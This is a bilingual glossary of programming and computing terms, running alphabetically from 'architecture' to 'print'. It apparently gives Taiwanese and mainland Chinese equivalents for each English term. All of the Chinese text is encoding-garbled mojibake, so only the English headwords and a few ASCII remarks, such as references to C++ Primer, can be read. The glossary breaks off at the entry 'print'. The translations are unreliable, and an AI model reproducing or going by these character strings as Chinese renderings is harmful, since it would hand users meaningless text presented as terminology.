æ¶æ„ã€ç³»ç»Ÿæ¶æ„ ä½“ç³»ç»“æ„ argument å¼•æ•°ï¼ˆä¼ ç»™å‡½å¼çš„å€¼ï¼‰ã€‚åè§ parameter åæ•°ã€å®è´¨åæ•°ã€å®åã€è‡ªå˜é‡ array é˜µåˆ— æ•°ç»„ arrow operator arrow ï¼ˆç®­å¤´ï¼‰è¿ç®—å­ ç®­å¤´æ“ä½œç¬¦ assembly è£…é…ä»¶ assembly language ç»„åˆè¯­è¨€ æ±‡ç¼–è¯­è¨€ assert (ion) æ–­è¨€ assign æŒ‡æ´¾ã€æŒ‡å®šã€è®¾å€¼ã€èµ‹å€¼ èµ‹å€¼ assignment æŒ‡æ´¾ã€æŒ‡å®š èµ‹å€¼ã€åˆ†é… assignment operator æŒ‡æ´¾ï¼ˆèµ‹å€¼ï¼‰è¿ç®—å­ = èµ‹å€¼æ“ä½œç¬¦ associated ç›¸åº”çš„ã€ç›¸å…³çš„ ç›¸å…³çš„ã€å…³è”ã€ç›¸åº”çš„ associative container å…³è”å¼å®¹å™¨ï¼ˆå¯¹åº” sequential containerï¼‰ å…³è”å¼å®¹å™¨ atomic ä¸å¯åˆ†å‰²çš„ åŸå­çš„ attribute å±æ€§ å±æ€§ã€ç‰¹æ€§ audio éŸ³è®¯ éŸ³é¢‘ A.I. äººå·¥æ™ºæ…§ äººå·¥æ™ºèƒ½ B background èƒŒæ™¯ èƒŒæ™¯ï¼ˆç”¨æ–¼å›¾å½¢ç€è‰²ï¼‰ åå°ï¼ˆç”¨æ–¼è¡Œç¨‹ï¼‰ backward compatible å›æº¯ç›¸å®¹ å‘ä¸‹å…¼å®¹ bandwidth é¢‘å®½ å¸¦å®½ base class åŸºç¡€ç±»åˆ« åŸºç±» base type åŸºç¡€å‹åˆ« (ç­‰åŒæ–¼ base class) batch æ‰¹æ¬¡ï¼ˆæ„æ€æ˜¯æ•´æ‰¹ä½œä¸šï¼‰ æ‰¹å¤„ç† benefit åˆ©ç›Š æ”¶ç›Š best viable function æœ€ä½³å¯è¡Œå‡½å¼ æœ€ä½³å¯è¡Œå‡½å¼ ï¼ˆä» viable functions ä¸­æŒ‘å‡ºçš„æœ€ä½³å»åˆè€…ï¼‰ binary search äºŒåˆ†æœå¯»æ³• äºŒåˆ†æŸ¥æ‰¾ binary tree äºŒå…ƒæ ‘ äºŒå‰æ ‘ binary function äºŒå…ƒå‡½å¼ åŒåå‡½æ•° binary operator äºŒå…ƒè¿ç®—å­ äºŒå…ƒæ“ä½œç¬¦ binding ç³»ç»“ ç»‘å®š bit ä½å…ƒ ä½ bit field ä½å…ƒæ  ä½åŸŸ bitmap ä½å…ƒå›¾ ä½å›¾ bitwise ä»¥ bit ä¸ºå•å…ƒé€ä¸€â”… bitwise copy ä»¥ bit ä¸ºå•å…ƒè¿›è¡Œå¤åˆ¶ï¼›ä½å…ƒé€ä¸€å¤åˆ¶ ä½æ‹·è´ block åŒºå—,åŒºæ®µ å—ã€åŒºå—ã€è¯­å¥å— boolean å¸ƒæ—å€¼ï¼ˆçœŸå‡å€¼ï¼Œtrue æˆ– falseï¼‰ å¸ƒå°”å€¼ border è¾¹æ¡†ã€æ¡†çº¿ è¾¹æ¡† brace (curly brace) å¤§æ‹¬å¼§ã€å¤§æ‹¬å· èŠ±æ‹¬å¼§ã€èŠ±æ‹¬å· bracket (square brakcet) ä¸­æ‹¬å¼§ã€ä¸­æ‹¬å· æ–¹æ‹¬å¼§ã€æ–¹æ‹¬å· breakpoint ä¸­æ–­ç‚¹ æ–­ç‚¹ build å»ºé€ ã€æ„ç­‘ã€å»ºç½®ï¼ˆMS ç”¨è¯­ï¼‰ buildï¼in å†…å»º å†…ç½® bus æ±‡æµæ’ æ€»çº¿ business å•†åŠ¡,ä¸šåŠ¡ ä¸šåŠ¡ buttons æŒ‰é’® æŒ‰é’® byte ä½å…ƒç»„ï¼ˆç”± 8 bits ç»„æˆï¼‰ å­—èŠ‚ C cache å¿«å– é«˜é€Ÿç¼“å­˜ call å‘¼å«ã€å«ç”¨ è°ƒç”¨ callback å›å‘¼ å›è°ƒ call operator call ï¼ˆå‡½å¼å‘¼å«ï¼‰è¿ç®—å­è°ƒç”¨æ“ä½œç¬¦ ï¼ˆåŒ function call operatorï¼‰ candidate function å€™é€‰å‡½å¼ å€™é€‰å‡½æ•° ï¼ˆåœ¨å‡½å¼å¤šè½½å†³è®®ç¨‹åºä¸­å‡ºç°çš„å€™é€‰å‡½å¼ï¼‰ chain ä¸²é“¾ï¼ˆä¾‹ chain of function callsï¼‰ é“¾ character å­—å…ƒ å­—ç¬¦ check box æ ¸å–æ–¹å— (i.e. check button) å¤é€‰æ¡† checked exception å¯æ§å¼å¼‚å¸¸(Java) check button æ–¹é’® (i.e. check box) å¤é€‰æŒ‰é’® child class å­ç±»åˆ«ï¼ˆæˆ–ç§°ä¸ºderived class, subtypeï¼‰ å­ç±» class ç±»åˆ« ç±» class body ç±»åˆ«æœ¬ä½“ ç±»ä½“ class declaration ç±»åˆ«å®£å‘Šã€ç±»åˆ«å®£å‘Šå¼ ç±»å£°æ˜ class definition ç±»åˆ«å®šä¹‰ã€ç±»åˆ«å®šä¹‰å¼ ç±»å®šä¹‰ class derivation list ç±»åˆ«è¡åŒ–åˆ— ç±»ç»§æ‰¿åˆ—è¡¨ class head ç±»åˆ«è¡¨å¤´ ç±»å¤´ class hierarchy ç±»åˆ«ç»§æ‰¿ä½“ç³», ç±»åˆ«é˜¶å±‚ ç±»å±‚æ¬¡ä½“ç³» class library ç±»åˆ«ç¨‹å¼åº“ã€ç±»åˆ«åº“ ç±»åº“ class template ç±»åˆ«æ¨¡æ¿ã€ç±»åˆ«èŒƒæœ¬ ç±»æ¨¡æ¿ class template partial specializations ç±»åˆ«æ¨¡æ¿åç‰¹åŒ– ç±»æ¨¡æ¿éƒ¨åˆ†ç‰¹åŒ– class template specializations ç±»åˆ«æ¨¡æ¿ç‰¹åŒ– ç±»æ¨¡æ¿ç‰¹åŒ– cleanup æ¸…ç†ã€å–„å æ¸…ç†ã€æ¸…é™¤ client å®¢ç«¯ã€å®¢æˆ·ç«¯ã€å®¢æˆ· å®¢æˆ· clientï¼server ä¸»ä»æ¶æ„ å®¢æˆ·/æœåŠ¡å™¨ clipboard å‰ªè´´ç°¿ å‰ªè´´æ¿ clone å¤åˆ¶ å…‹éš† collection ç¾¤é›† é›†åˆ combo box å¤åˆæ–¹å—ã€å¤åˆæ¡† ç»„åˆæ¡† command line å‘½ä»¤åˆ— å‘½ä»¤è¡Œ (ç³»ç»Ÿæ–‡å­—æ¨¡å¼ä¸‹çš„æ•´è¡Œæ‰§è¡Œå‘½ä»¤) communication é€šè®¯ é€šè®¯ compatible ç›¸å®¹ å…¼å®¹ compile time ç¼–è¯‘æœŸ ç¼–è¯‘æœŸã€ç¼–è¯‘æ—¶ compiler ç¼–è¯‘å™¨ ç¼–è¯‘å™¨ component ç»„ä»¶ ç»„ä»¶ composition å¤åˆã€åˆæˆã€ç»„åˆ ç»„åˆ computer ç”µè„‘ã€è®¡ç®—æœº è®¡ç®—æœºã€ç”µè„‘ concept æ¦‚å¿µ æ¦‚å¿µ concrete å…·è±¡çš„ å®åœ¨çš„ concurrent å¹¶è¡Œ å¹¶å‘ configuration ç»„æ€ é…ç½® connection è¿æ¥ï¼Œè¿çº¿ï¼ˆç½‘ç»œ,èµ„æ–™åº“ï¼‰ è¿æ¥ constraint çº¦æŸï¼ˆæ¡ä»¶ï¼‰ construct æ„ä»¶ æ„ä»¶ container å®¹å™¨ å®¹å™¨ï¼ˆå­˜æ”¾èµ„æ–™çš„æŸç§ç»“æ„å¦‚ list, vectorâ€¦ï¼‰ containment å†…å« åŒ…å®¹ context èƒŒæ™¯å…³ç³»ã€å‘¨é­ç¯å¢ƒã€ä¸Šä¸‹è„‰ç»œ ç¯å¢ƒã€ä¸Šä¸‹æ–‡ control æ§åˆ¶å…ƒä»¶ã€æ§ä»¶ æ§ä»¶ console ä¸»æ§å° æ§åˆ¶å° const å¸¸æ•°ï¼ˆconstant çš„ç¼©å†™ï¼ŒC++ å…³é”®å­—ï¼‰ constant å¸¸æ•°ï¼ˆç›¸å¯¹æ–¼ variableï¼‰ å¸¸é‡ constructor (ctorï¼‰ å»ºæ„å¼ æ„é€ å‡½æ•° ï¼ˆä¸class åŒåçš„ä¸€ç§ member functionsï¼‰ copy (v) å¤åˆ¶ã€æ‹·è´ æ‹·è´ copy (n) å¤ä»¶, å‰¯æœ¬ cover æ¶µç›– è¦†ç›– create åˆ›å»ºã€å»ºç«‹ã€äº§ç”Ÿã€ç”Ÿæˆ åˆ›å»º creation äº§ç”Ÿã€ç”Ÿæˆ åˆ›å»º cursor æ¸¸æ ‡ å…‰æ ‡ custom è®¢åˆ¶ã€è‡ªå®š å®šåˆ¶ D data èµ„æ–™ æ•°æ® database èµ„æ–™åº“ æ•°æ®åº“ database schema æ•°æ®åº“ç»“æ„çº²ç›® data member èµ„æ–™æˆå‘˜ã€æˆå‘˜å˜æ•° æ•°æ®æˆå‘˜ã€æˆå‘˜å˜é‡ data structure èµ„æ–™ç»“æ„ æ•°æ®ç»“æ„ datagram èµ„æ–™å…ƒ æ•°æ®æŠ¥æ–‡ dead lock æ­»ç»“ æ­»é” debug é™¤é”™ è°ƒè¯• debugger é™¤é”™å™¨ è°ƒè¯•å™¨ declaration å®£å‘Šã€å®£å‘Šå¼ å£°æ˜ deduction æ¨å¯¼ï¼ˆä¾‹ï¼štemplate argument deductionï¼‰ æ¨å¯¼ã€æ¨æ–­ default é¢„è®¾ ç¼ºçœã€é»˜è®¤ defer å»¶ç¼“ æ¨è¿Ÿ define å®šä¹‰ é¢„å®šä¹‰ definition å®šä¹‰ã€å®šä¹‰åŒºã€å®šä¹‰å¼ å®šä¹‰ delegate å§”æ´¾ã€å§”æ‰˜ã€å§”ä»» å§”æ‰˜ delegation ï¼ˆåŒä¸Šï¼‰ demarshal åç¼–åˆ— æ•£é›† dereference æé¢†ï¼ˆå–å‡ºæŒ‡æ ‡æ‰€æŒ‡ç‰©ä½“çš„å†…å®¹ï¼‰ è§£åè€ƒ dereference operator dereference ï¼ˆæé¢†ï¼‰è¿ç®—å­ * è§£åè€ƒæ“ä½œç¬¦ derived class è¡ç”Ÿç±»åˆ« æ´¾ç”Ÿç±» design by contract å¥‘çº¦å¼è®¾è®¡ design pattern è®¾è®¡èŒƒå¼ã€è®¾è®¡æ ·å¼ è®¾è®¡æ¨¡å¼ â€» æœ€è¿‘æˆ‘æ¯”è¾ƒå–œæ¬¢ã€Œè®¾è®¡èŒƒå¼ã€ä¸€è¯ destroy æ‘§æ¯ã€é”€æ¯ destructor è§£æ„å¼ ææ„å‡½æ•° device è£…ç½®ã€è®¾å¤‡ è®¾å¤‡ dialog å¯¹è¯çª—ã€å¯¹è¯ç›’ å¯¹è¯æ¡† directive æŒ‡ä»¤ï¼ˆä¾‹ï¼šusing directiveï¼‰ (ç¼–è¯‘)æŒ‡ç¤ºç¬¦ directory ç›®å½• ç›®å½• disk ç¢Ÿ ç›˜ dispatch åˆ†æ´¾ åˆ†æ´¾ distributed computing åˆ†å¸ƒå¼è®¡ç®— (åˆ†å¸ƒå¼ç”µç®—) åˆ†å¸ƒå¼è®¡ç®— åˆ†æ•£å¼è®¡ç®— (åˆ†æ•£å¼ç”µç®—) document æ–‡ä»¶ æ–‡æ¡£ dot operator dot ï¼ˆå¥ç‚¹ï¼‰è¿ç®—å­ . (åœ†)ç‚¹æ“ä½œç¬¦ driver é©±åŠ¨ç¨‹å¼ é©±åŠ¨ï¼ˆç¨‹åºï¼‰ dynamic binding åŠ¨æ€ç³»ç»“ åŠ¨æ€ç»‘å®š E efficiency æ•ˆç‡ æ•ˆç‡ efficient é«˜æ•ˆ é«˜æ•ˆ end user ç»ˆç«¯ç”¨æˆ· entity ç‰©ä½“ å®ä½“ã€ç‰©ä½“ encapsulation å°è£… å°è£… enclosing class å¤–å›´ç±»åˆ«ï¼ˆä¸å·¢çŠ¶ç±»åˆ« nested class æœ‰å…³ï¼‰å¤–å›´ç±» enum (enumeration) åˆ—ä¸¾ï¼ˆä¸€ç§ C++ èµ„æ–™å‹åˆ«ï¼‰ æšä¸¾ enumerators åˆ—ä¸¾å…ƒï¼ˆenum å‹åˆ«ä¸­çš„æˆå‘˜ï¼‰ æšä¸¾æˆå‘˜ã€æšä¸¾å™¨ equal ç›¸ç­‰ ç›¸ç­‰ equality ç›¸ç­‰æ€§ ç›¸ç­‰æ€§ equality operator equality ï¼ˆç­‰å·ï¼‰è¿ç®—å­ == ç­‰å·æ“ä½œç¬¦ equivalence ç­‰ä»·æ€§ã€ç­‰åŒæ€§ã€å¯¹ç­‰æ€§ ç­‰ä»·æ€§ equivalent ç­‰ä»·ã€ç­‰åŒã€å¯¹ç­‰ ç­‰ä»· escape code è½¬ä¹‰ç  è½¬ä¹‰ç  evaluate è¯„ä¼°ã€æ±‚å€¼ã€æ ¸å®š è¯„ä¼° event äº‹ä»¶ äº‹ä»¶ event driven äº‹ä»¶é©±åŠ¨çš„ äº‹ä»¶é©±åŠ¨çš„ exception å¼‚å¸¸æƒ…å†µ å¼‚å¸¸ exception declaration å¼‚å¸¸å®£å‘Šï¼ˆref. C++ Primer 3/e, 11.3ï¼‰ å¼‚å¸¸å£°æ˜ exception handling å¼‚å¸¸å¤„ç†ã€å¼‚å¸¸å¤„ç†æœºåˆ¶ å¼‚å¸¸å¤„ç†ã€å¼‚å¸¸å¤„ç†æœºåˆ¶ exception specification å¼‚å¸¸è§„æ ¼ï¼ˆref. C++ Primer 3/e, 11.4ï¼‰ å¼‚å¸¸è§„èŒƒ exit é€€ç¦»ï¼ˆæŒ‡ç¦»å¼€å‡½å¼æ—¶çš„é‚£ä¸€ä¸ªæ‰§è¡Œç‚¹ï¼‰ é€€å‡º explicit æ˜ç™½çš„ã€æ˜æ˜¾çš„ã€æ˜¾å¼ æ˜¾å¼ export æ±‡å‡º å¼•å‡ºã€å¯¼å‡º expression è¿ç®—å¼ã€ç®—å¼ è¡¨è¾¾å¼ F facility è®¾æ–½ã€è®¾å¤‡ è®¾æ–½ã€è®¾å¤‡ feature ç‰¹æ€§ field æ ä½,èµ„æ–™æ ï¼ˆJavaï¼‰ å­—æ®µ, å€¼åŸŸï¼ˆJavaï¼‰ file æ¡£æ¡ˆ æ–‡ä»¶ firmware éŸ§ä½“ å›ºä»¶ flag æ——æ ‡ æ ‡è®° flash memory å¿«é—ªè®°å¿†ä½“ é—ªå­˜ flexibility å¼¹æ€§ çµæ´»æ€§ flush æ¸…ç†ã€æ‰«æ¸… åˆ·æ–° font å­—å‹ å­—ä½“ form è¡¨å•ï¼ˆprogramming ç”¨è¯­ï¼‰ çª—ä½“ formal parameter å½¢å¼åæ•° å½¢å¼åæ•° forward declaration å‰ç½®å®£å‘Š å‰ç½®å£°æ˜ forwarding è½¬å‘¼å«,è½¬å‘ è½¬å‘ forwarding function è½¬å‘¼å«å‡½å¼,è½¬å‘å‡½å¼ è½¬å‘å‡½æ•° fractal ç¢å½¢ åˆ†å½¢ framework æ¡†æ¶ æ¡†æ¶ full specialization å…¨ç‰¹åŒ–ï¼ˆref. partial specializationï¼‰ function å‡½å¼ã€å‡½æ•° å‡½æ•° function call operator åŒ call operator function object å‡½å¼ç‰©ä»¶ï¼ˆref. C++ Primer 3/e, 12.3ï¼‰ å‡½æ•°å¯¹è±¡ function overloaded resolution å‡½å¼å¤šè½½å†³è®®ç¨‹åº å‡½æ•°é‡è½½è§£å†³ï¼ˆæ–¹æ¡ˆï¼‰ functionality åŠŸèƒ½ã€æœºèƒ½ åŠŸèƒ½ function template å‡½å¼æ¨¡æ¿ã€å‡½å¼èŒƒæœ¬ å‡½æ•°æ¨¡æ¿ functor ä»¿å‡½å¼ ä»¿å‡½å¼ã€å‡½å­ G game æ¸¸æˆ æ¸¸æˆ generate ç”Ÿæˆ generic æ³›å‹ã€ä¸€èˆ¬åŒ–çš„ ä¸€èˆ¬åŒ–çš„ã€é€šç”¨çš„ã€æ³›åŒ– generic algorithm æ³›å‹æ¼”ç®—æ³• é€šç”¨ç®—æ³• getter (ç›¸å¯¹æ–¼ setter) å–å€¼å‡½å¼ global å…¨åŸŸçš„ï¼ˆå¯¹åº”æ–¼ localï¼‰ å…¨å±€çš„ global object å…¨åŸŸç‰©ä»¶ å…¨å±€å¯¹è±¡ global scope resolution operator å…¨åŸŸç”Ÿå­˜ç©ºé—´ï¼ˆèŒƒå›´å†³è®®ï¼‰è¿ç®—å­ :: å…¨å±€èŒƒå›´è§£ææ“ä½œç¬¦ group ç¾¤ç»„ group box ç¾¤ç»„æ–¹å— åˆ†ç»„æ¡† guard clause å«è¿°å¥ (Refactoring, p250) å«è¯­å¥ GUI å›¾å½¢ä»‹é¢ å›¾å½¢ç•Œé¢ H hand shaking æ¡æ‰‹åå•† handle è¯†åˆ«ç ã€è¯†åˆ«å·ã€å·ç ç‰Œã€æƒæŸ„ å¥æŸ„ handler å¤„ç†å¸¸å¼ å¤„ç†å‡½æ•° hardï¼coded ç¼–æ­»çš„ ç¡¬ç¼–ç çš„ hardï¼copy ç¡¬æ‹·å›¾ å±å¹•æˆªå›¾ hard disk ç¡¬ç¢Ÿ ç¡¬ç›˜ hardware ç¡¬ä½“ ç¡¬ä»¶ hash table æ‚å‡‘è¡¨ å“ˆå¸Œè¡¨ã€æ•£åˆ—è¡¨ header file è¡¨å¤´æ¡£ã€æ ‡å¤´æ¡£ å¤´æ–‡ä»¶ heap å †ç§¯ å † hierarchy é˜¶å±‚ä½“ç³» å±‚æ¬¡ç»“æ„ï¼ˆä½“ç³»ï¼‰ hook æŒ‚é’© é’©å­ hyperlink è¶…é“¾ç»“ è¶…é“¾æ¥ I icon å›¾ç¤ºã€å›¾æ ‡ å›¾æ ‡ IDE æ•´åˆå¼€å‘ç¯å¢ƒ é›†æˆå¼€å‘ç¯å¢ƒ identifier è¯†åˆ«å­—ã€è¯†åˆ«ç¬¦å· æ ‡è¯†ç¬¦ if and only if è‹¥ä¸”å”¯è‹¥ å½“ä¸”ä»…å½“ Illinois ä¼Šåˆ©è¯º ä¼Šåˆ©è¯ºæ–¯ image å½±åƒ å›¾è±¡ immediate base ç›´æ¥çš„ï¼ˆç´§ä¸´çš„ï¼‰ä¸Šå±‚ base classã€‚ ç›´æ¥ä¸Šå±‚åŸºç±» immediate derived ç›´æ¥çš„ï¼ˆç´§ä¸´çš„ï¼‰ä¸‹å±‚ derived classã€‚ ç›´æ¥ä¸‹å±‚æ´¾ç”Ÿç±» immutability ä¸å˜æ€§ immutable ä¸å¯å˜ï¼ˆçš„ï¼‰ implement å®ä½œã€å®ç° å®ç° implementation å®ä½œå“ã€å®ä½œä½“ã€å®ä½œç ã€å®ä»¶ å®ç° implicit éšå–»çš„ã€æš—è‡ªçš„ã€éšå¼ éšå¼ import æ±‡å…¥ å¯¼å…¥ increment operator ç´¯åŠ è¿ç®—å­ ++ å¢åŠ æ“ä½œç¬¦ infinite loop æ— ç©·å›åœˆ æ— é™å¾ªç¯ infinite recursive æ— ç©·é€’å› æ— é™é€’å½’ information èµ„è®¯ ä¿¡æ¯ infrastructure å…¬å…±åŸºç¡€å»ºè®¾ inheritance ç»§æ‰¿ã€ç»§æ‰¿æœºåˆ¶ ç»§æ‰¿ã€ç»§æ‰¿æœºåˆ¶ inline è¡Œå†… å†…è” inline expansion è¡Œå†…å±•å¼€ å†…è”å±•å¼€ initialization åˆå§‹åŒ–ï¼ˆåŠ¨ä½œï¼‰ åˆå§‹åŒ– initialization list åˆå€¼åˆ— åˆå§‹å€¼åˆ—è¡¨ initialize åˆå§‹åŒ– åˆå§‹åŒ– inner class å†…éšç±»åˆ« å†…åµŒç±» instance å®ä½“ å®ä¾‹ ï¼ˆæ ¹æ®æŸç§è¡¨è¿°è€Œå®é™…äº§ç”Ÿçš„ã€Œä¸œè¥¿ã€ï¼‰ instantiated å…·ç°åŒ–ã€å®ä½“åŒ–ï¼ˆå¸¸åº”ç”¨æ–¼ templateï¼‰ å®ä¾‹åŒ– instantiation å…·ç°ä½“ã€å…·ç°åŒ–å®ä½“ï¼ˆå¸¸åº”ç”¨æ–¼ templateï¼‰ å®ä¾‹ integer (integral) æ•´æ•°ï¼ˆçš„ï¼‰ æ•´å‹ï¼ˆçš„ï¼‰ integrate æ•´åˆ é›†æˆ interacts äº¤è°ˆã€äº’åŠ¨ äº¤äº’ interface ä»‹é¢ æ¥å£ for GUI ä»‹é¢ ç•Œé¢ interpreter ç›´è¯‘å™¨ è§£é‡Šå™¨ invariants æ’å¸¸æ€§,çº¦æŸæ¡ä»¶ çº¦æŸæ¡ä»¶ invoke å”¤èµ· è°ƒç”¨ iterate è¿­ä»£ï¼ˆå›åœˆä¸€ä¸ªè½®å›ä¸€ä¸ªè½®å›åœ°è¿›è¡Œï¼‰ è¿­ä»£ iterative åè¦†çš„ï¼Œè¿­ä»£çš„ iterator è¿­ä»£å™¨ï¼ˆä¸€ç§æ³›å‹æŒ‡æ ‡ï¼‰ è¿­ä»£å™¨ iteration è¿­ä»£ï¼ˆå›åœˆæ¯æ¬¡è½®å›ç§°ä¸ºä¸€ä¸ª iterationï¼‰ è¿­ä»£ item é¡¹ç›®ã€æ¡æ¬¾ é¡¹ã€æ¡æ¬¾ã€é¡¹ç›® L laser é›·å°„ æ¿€å…‰ level é˜¶ å±‚ (çº§) ä¾‹ high level é«˜é˜¶ é«˜å±‚ library ç¨‹å¼åº“ã€å‡½å¼åº“ åº“ã€å‡½æ•°åº“ lifetime ç”Ÿå‘½æœŸã€å¯¿å‘½ ç”Ÿå‘½æœŸã€å¯¿å‘½ link è”ç»“ã€è¿ç»“ è¿æ¥,é“¾æ¥ linker è”ç»“å™¨ã€è¿ç»“å™¨ è¿æ¥å™¨ literal constant å­—é¢å¸¸æ•°ï¼ˆä¾‹ 3.14 æˆ– â€œhiâ€ è¿™ç­‰å¸¸æ•°å€¼ï¼‰ å­—é¢å¸¸æ•° list ä¸²åˆ—ï¼ˆlinkedï¼listï¼‰ åˆ—è¡¨ã€è¡¨ã€é“¾è¡¨ list box åˆ—è¡¨æ–¹å—ã€åˆ—è¡¨æ¡† åˆ—è¡¨æ¡† load è½½å…¥ è£…è½½ loader è½½å…¥å™¨ è£…è½½å™¨ã€è½½å…¥å™¨ local åŒºåŸŸçš„ï¼ˆå¯¹åº”æ–¼ globalï¼‰ å±€éƒ¨çš„ local object åŒºåŸŸç‰©ä»¶ å±€éƒ¨å¯¹è±¡ lock æœºé” loop å›åœˆ å¾ªç¯ lvalue å·¦å€¼ å·¦å€¼ M macro å·¨é›† å® magic number é­”æœ¯æ•°å­— é­”æ³•æ•° maintain ç»´æŠ¤ ç»´æŠ¤ manipulator æ“çºµå™¨ï¼ˆiostream é¢„å…ˆå®šä¹‰çš„ä¸€ç§ä¸œè¥¿ï¼‰ æ“çºµå™¨ marshal ç¼–åˆ— åˆ—é›† åè€ƒ demarshal mechanism æœºåˆ¶ æœºåˆ¶ member æˆå‘˜ æˆå‘˜ member access operator æˆå‘˜å–ç”¨è¿ç®—å­ï¼ˆæœ‰ dot å’Œ arrow ä¸¤ç§ï¼‰ æˆå‘˜å­˜å–æ“ä½œç¬¦ member function æˆå‘˜å‡½å¼ æˆå‘˜å‡½æ•° member initialization list æˆå‘˜åˆå€¼åˆ— æˆå‘˜åˆå§‹å€¼åˆ—è¡¨ memberwise ä»¥ member ä¸ºå•å…ƒâ”…ã€members é€ä¸€â”… ä»¥æˆå‘˜ä¸ºå•ä½ memberwise copy ä»¥ members ä¸ºå•å…ƒé€ä¸€å¤åˆ¶ memory è®°å¿†ä½“ å†…å­˜ menu è¡¨å•ã€é€‰å• èœå• message è®¯æ¯ æ¶ˆæ¯ message based ä»¥è®¯æ¯ä¸ºåŸºç¡€çš„ åŸºæ–¼æ¶ˆæ¯çš„ message loop è®¯æ¯å›åœˆ æ¶ˆæ¯ç¯ method (Java) æ–¹æ³•ã€è¡Œä¸ºã€å‡½å¼ æ–¹æ³• meta micro å¾® middleware ä¸­ä»‹å±‚ ä¸­é—´ä»¶ modeling æ¨¡å¡‘ modeling language å¡‘æ¨¡è¯­è¨€ï¼Œå»ºæ¨¡è¯­è¨€ modem æ•°æ®æœº è°ƒåˆ¶è§£è°ƒå™¨ module æ¨¡ç»„ æ¨¡å— modifier é¥°è¯ ä¿®é¥°ç¬¦ most derived class æœ€æœ«å±‚è¡ç”Ÿç±»åˆ« æœ€åº•å±‚çš„æ´¾ç”Ÿç±» mouse æ»‘é¼  é¼ æ ‡ mutable å¯å˜çš„ å¯å˜çš„ multiï¼tasking å¤šå·¥ å¤šä»»åŠ¡ N namespace å‘½åç©ºé—´ åå­—ç©ºé—´ã€å‘½åç©ºé—´ native åŸç”Ÿçš„ æœ¬åœ°çš„ã€å›ºæœ‰çš„ nested class å·¢çŠ¶ç±»åˆ« åµŒå¥—ç±» network ç½‘è·¯ ç½‘ç»œ network card ç½‘è·¯å¡ ç½‘å¡ O object ç‰©ä»¶ å¯¹è±¡ object based ä»¥ç‰©ä»¶ä¸ºåŸºç¡€çš„ åŸºæ–¼å¯¹è±¡çš„ object file ç›®çš„æ¡£ ç›®æ ‡æ–‡ä»¶ object model ç‰©ä»¶æ¨¡å‹ å¯¹è±¡æ¨¡å‹ object oriented ç‰©ä»¶å¯¼å‘çš„ é¢å‘å¯¹è±¡çš„ online çº¿ä¸Š åœ¨çº¿ opaque ä¸é€æ˜çš„ operand è¿ç®—å…ƒ æ“ä½œæ•° operating system (OS) ä½œä¸šç³»ç»Ÿ æ“ä½œç³»ç»Ÿ operation æ“ä½œã€æ“ä½œè¡Œä¸º æ“ä½œ operator è¿ç®—å­ æ“ä½œç¬¦ã€è¿ç®—ç¬¦ option é€‰é¡¹ï¼Œå¯é€‰æ–¹æ¡ˆ é€‰é¡¹ ordinary å¸¸è§„çš„ å¸¸è§„çš„ overflow ä¸Šé™æº¢ä½ï¼ˆç›¸å¯¹æ–¼ underflowï¼‰ æº¢å‡ºï¼ˆunderflow:ä¸‹æº¢ï¼‰ overhead é¢å¤–è´Ÿæ‹…ã€é¢å¤–å¼€é”€ é¢å¤–å¼€é”€ overload å¤šè½½åŒ–ã€å¤šè½½åŒ–ã€é‡è½½ é‡è½½ overloaded function å¤šè½½åŒ–å‡½å¼ é‡è½½çš„å‡½æ•° overloaded operator å¤šè½½åŒ–è¿ç®—å­ è¢«é‡è½½çš„æ“ä½œç¬¦ overloaded set å¤šè½½é›†åˆ é‡è½½é›†åˆ override æ”¹å†™ã€è¦†å†™ é‡è½½ã€æ”¹å†™ã€é‡æ–°å®šä¹‰ ï¼ˆåœ¨ derived class ä¸­é‡æ–°å®šä¹‰è™šæ‹Ÿå‡½å¼ P package å¥—ä»¶ åŒ… pair å¯¹ç»„ palette è°ƒè‰²ç›˜ã€ç»„ä»¶ç›˜ã€å·¥å…·ç®± pane çª—æ ¼ çª—æ ¼ï¼ˆæœ‰æ—¶ä¸ºåµŒæ¿ä¹‹æ„ï¼Œä¾‹ Java Content Paneï¼‰ parallel å¹³è¡Œ å¹¶è¡Œ parameter åæ•°ï¼ˆå‡½å¼åæ•°åˆ—ä¸Šçš„å˜æ•°ï¼‰ åæ•°ã€å½¢å¼åæ•°ã€å½¢å parameter list åæ•°åˆ— åæ•°åˆ—è¡¨ parent class çˆ¶ç±»åˆ«ï¼ˆæˆ–ç§° base classï¼‰ çˆ¶ç±» parentheses å°æ‹¬å¼§ã€å°æ‹¬å· åœ†æ‹¬å¼§ã€åœ†æ‹¬å· parse è§£æ è§£æ part é›¶ä»¶ éƒ¨ä»¶ partial specialization åç‰¹åŒ–ï¼ˆref. C++ Primer 3/e, 16.10ï¼‰ å±€éƒ¨ç‰¹åŒ– ï¼ˆref. full specializationï¼‰ pass by address ä¼ å€ï¼ˆå‡½å¼å¼•æ•°çš„ä¼ é€’æ–¹å¼ï¼‰ï¼ˆéæ­£å¼ç”¨è¯­ï¼‰ä¼ åœ°å€ pass by reference ä¼ å€ï¼ˆå‡½å¼å¼•æ•°çš„ä¸€ç§ä¼ é€’æ–¹å¼ï¼‰ ä¼ åœ°å€, æŒ‰å¼•ç”¨ä¼ é€’ pass by value ä¼ å€¼ï¼ˆå‡½å¼å¼•æ•°çš„ä¸€ç§ä¼ é€’æ–¹å¼ï¼‰ æŒ‰å€¼ä¼ é€’ pattern èŒƒå¼ã€æ ·å¼ æ¨¡å¼ performance æ•ˆç‡ã€æ€§èƒ½å…¼è€Œæœ‰ä¹‹ æ€§èƒ½ persistence æ°¸ç»­æ€§ æŒä¹…æ€§ pixel å›¾ç´ ã€åƒç´  åƒç´  placement delete ref. C++ Primer3/e, 15.8.2 placement new ref. C++ Primer 3/e, 15.8.2 platform å¹³å° å¹³å° pointer æŒ‡æ ‡ æŒ‡é’ˆ å€ä½å™¨ï¼ˆå’Œå€åå™¨ reference å½¢æˆå¯¹æ˜ ï¼Œæ»¡å¥½ï¼‰ poll è½®è¯¢ è½®è¯¢ polymorphism å¤šå‹ å¤šæ€ pop up å†’èµ·å¼ã€å¼¹å‡ºå¼ å¼¹å‡ºå¼ port åŸ  ç«¯å£ postfix åç½®å¼ã€ååºå¼ åç½®å¼ precedence ä¼˜å…ˆåºï¼ˆé€šå¸¸ç”¨æ–¼è¿ç®—å­çš„ä¼˜å…ˆæ‰§è¡Œæ¬¡åºï¼‰ prefix å‰ç½®å¼ã€å‰åºå¼ å‰ç½®å¼ preprocessor å‰å¤„ç†å™¨ é¢„å¤„ç†å™¨ prime è´¨æ•° ç´ æ•° primitive type åŸºæœ¬å‹åˆ« (ä¸åŒæ–¼ base class,åŸºç¡€ç±»åˆ«) print 